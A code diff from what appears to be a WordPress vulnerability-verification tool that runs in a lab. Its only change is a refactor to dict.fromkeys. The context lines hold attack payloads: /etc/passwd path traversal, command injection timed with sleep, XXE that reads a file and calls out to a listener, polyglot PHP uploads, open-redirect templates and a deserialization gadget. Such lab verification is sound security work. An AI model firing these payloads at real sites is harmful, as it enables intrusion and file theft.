@@ -1409,7 +1409,7 @@ def verify_wordpress_account_takeover(
             return res
 
         m = (http_method or "POST").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, id_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -1585,7 +1585,7 @@ def verify_wordpress_direct_login_as(
             return res
 
         m = (http_method or "GET").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, id_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -1744,7 +1744,7 @@ def verify_wordpress_unauthenticated_login_bypass(
         victim_id = lab.wp_cli("user", "get", victim_user, "--field=ID", timeout=30).stdout.strip()
 
         m = (http_method or "POST").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         base_params[email_param] = victim_email
         res.evidence.update({
             "victima_user_id": victim_id, "victima_email": victim_email, "metodo": m,
@@ -1914,7 +1914,7 @@ def verify_wordpress_path_traversal(
             return res
 
         m = (http_method or "GET").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         # mismos bloqueos de infraestructura que SQLi (nonce/token sin resolver, ID ofuscado) --
         # ver _auto_resolve_wp_blockers: cualquier tecnica contra WordPress puede necesitarlo, no
         # solo SQLi.
@@ -2030,7 +2030,7 @@ def verify_wordpress_path_traversal(
             passwd_attempts += [("..%2f" * n) + "etc/passwd" for n in depths]
             for payload_value in passwd_attempts:
                 payload = (dict(parameters) if isinstance(parameters, dict)
-                          else {p: "" for p in (parameters or [])})
+                          else dict.fromkeys(parameters or [], ""))
                 payload[path_param] = payload_value
                 step(f"probando {m} {endpoint} con {path_param}={payload_value!r} "
                      f"(/etc/passwd)...")
@@ -2178,7 +2178,7 @@ def verify_wordpress_command_injection(
             f"echo {calc}", calc,
         ]
         m = (http_method or "GET").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, cmd_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -2237,7 +2237,7 @@ def verify_wordpress_command_injection(
         if not found:
             step("ninguna variante reflejo la suma; probando blind command injection por "
                  "temporizacion (sleep)...")
-            base_payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            base_payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
             base_payload[cmd_param] = "1"
             try:
                 t_base0 = time.time()
@@ -2251,7 +2251,7 @@ def verify_wordpress_command_injection(
             sleep_attempts = [f"; sleep {sleep_n}", f"| sleep {sleep_n}", f"`sleep {sleep_n}`",
                               f"$(sleep {sleep_n})", f"&& sleep {sleep_n}"]
             for sp in sleep_attempts:
-                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                 payload[cmd_param] = sp
                 step(f"probando {m} {endpoint} con {cmd_param}={sp!r} (temporizacion)...")
                 try:
@@ -2462,7 +2462,7 @@ def verify_wordpress_sqli(
             res.evidence["endpoint_shortcode_page"] = endpoint
 
         m = (http_method or "GET").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "1" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "1")
 
         # bloqueos de infraestructura comunes a CUALQUIER tecnica contra WordPress (nonce/token
         # sin resolver, ID de recurso ofuscado) -- ver _auto_resolve_wp_blockers, factorizado
@@ -2914,7 +2914,7 @@ def verify_wordpress_ssrf(
 
         listener_ip = lab.container_ip(lab.listener)
         m = (http_method or "GET").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, url_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -3064,7 +3064,7 @@ def verify_wordpress_xss(
             return res
 
         m = (http_method or "GET").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, xss_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -3165,8 +3165,7 @@ def verify_wordpress_xss(
                           f"reflexion sea distinto, que haya sanitizacion real, o que el efecto "
                           f"solo se vea en OTRA pagina que esta version no visita)")
             try:
-                sample_params = dict(parameters) if isinstance(parameters, dict) else {
-                    p: "" for p in (parameters or [])}
+                sample_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                 sample_params[xss_param] = attempts[0] if attempts else ""
                 sample_resp = boot.sub_sess.request(
                     m, boot.base_url + endpoint,
@@ -3250,7 +3249,7 @@ def verify_wordpress_ssti(
         attempt_pairs = [(p, expected) for p in attempts] + load_ssti_arithmetic_payloads(a, b)
 
         m = (http_method or "GET").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, ssti_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -3374,7 +3373,7 @@ def verify_wordpress_xxe(
         xxe_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                   f'"file://{canary_path}">]><foo>&xxe;</foo>')
         m = (http_method or "GET").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, xml_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -3469,7 +3468,7 @@ def verify_wordpress_xxe(
                 oob_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                           f'"http://{lab.listener}:8080/binoracle-xxe-oob-{oob_token}">]>'
                           f'<foo>&xxe;</foo>')
-                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
                 if xml_param:
                     payload[xml_param] = oob_xml
                     try:
@@ -3591,7 +3590,7 @@ def verify_wordpress_open_redirect(
         from .payload_kb import load_open_redirect_templates
         targets += load_open_redirect_templates(evil_host)
         m = (http_method or "GET").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, redirect_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -3724,7 +3723,7 @@ def verify_wordpress_file_upload(
             ("binoracle_{t}.jpg", b"\xff\xd8\xff\xe0", "image/jpeg"),    # polyglot JPEG SOI + PHP
             ("binoracle_{t}.png", b"\x89PNG\r\n\x1a\n", "image/png"),    # polyglot PNG + PHP
         ]
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, file_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -4098,7 +4097,7 @@ def verify_wordpress_csrf(
             return res
 
         m = (http_method or "POST").upper()
-        payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         for k in list(payload.keys()):
             if any(h in k.lower() for h in ("nonce", "token", "csrf")):
                 del payload[k]
@@ -4266,7 +4265,7 @@ def verify_wordpress_deserialization(
         canary_path = f"/tmp/binoracle_deser_{_token()}.txt"
         payload_obj = build_php_serialized_object(gadget, canary_path, secret)
         m = (http_method or "POST").upper()
-        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         endpoint, base_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, endpoint, base_params, serial_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
@@ -4433,7 +4432,7 @@ def verify_wordpress_deserialization_custom_table(
             "store_endpoint": store_endpoint,
         })
 
-        base_store_params = dict(store_parameters) if isinstance(store_parameters, dict) else {p: "" for p in (store_parameters or [])}
+        base_store_params = dict(store_parameters) if isinstance(store_parameters, dict) else dict.fromkeys(store_parameters or [], "")
         store_endpoint, base_store_params = _auto_resolve_wp_blockers(
             boot, lab, slug, m, store_endpoint, base_store_params, serial_param, res, step,
             extra_nonce_pages=extra_nonce_pages)
